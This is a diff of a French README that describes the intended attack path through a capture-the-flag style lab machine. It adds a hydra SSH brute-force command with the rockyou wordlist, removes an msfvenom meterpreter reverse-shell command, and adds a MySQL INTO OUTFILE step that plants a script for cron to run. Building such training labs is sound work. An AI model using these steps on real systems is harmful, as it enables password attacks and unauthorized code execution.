@@ -16,8 +16,11 @@ L'utilisateur lorsque qu'il est sur la machine n'aura en premier lieu accès à 
 Via un autre machine l'utilisateur devra faire un 
 ```bash
 nmap -sV -sC [ipmachine]
+hydra -L user.txt -P rockyou.txt 10.10.219.212 ssh
 ```
 Il pourra s'apercevoir qu'un service mysql est ouvert celui sera protéger par un mot de passe et face aux tentatives de bruteforce.
+
+De plus toutes les minutes sur sa console apparaitera un message lui indiquant que des scripts ont été bougé ainsi que l'heure de la machine.
 
 ## Etape 2
 
@@ -80,10 +83,11 @@ mysql -h [ip.host] -u root -p[PASSWORD]
 
 ## Etape 5
 
-Une fois connecté au port SQL avec les droits root, l'utilisateur sera en possibilité d'éxecuter un reverse shell sur la machine host à l'aide de la librairie metasploit.
+Une fois connecté au port SQL avec les droits root, l'utilisateur sera en possibilité d'executer des requêtes SQL pour placer un dossier dans la data directory de mysql, qui sera ensuite deplacé dans un fichier où il sera executé par cron.
 
 ```bash
-[msfvenom   linux/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=3306 -f exe -o payload.exe -a x64 --platform linux      ] (on est pas sur mais wola ça marche )
+use scripts
+SELECT text_script FROM script WHERE nom_script='remind_admin_psswq.sh' INTO OUTFILE 'pass.sh';
 ```
 
-Il devra ensuite naviguer dans les fichiers et récupérer le flag.
+Dans son terminal, s'affichera ainsi l'heure ainsi que le mot de passe admin, il pourra ainsi acceder au compte admin.
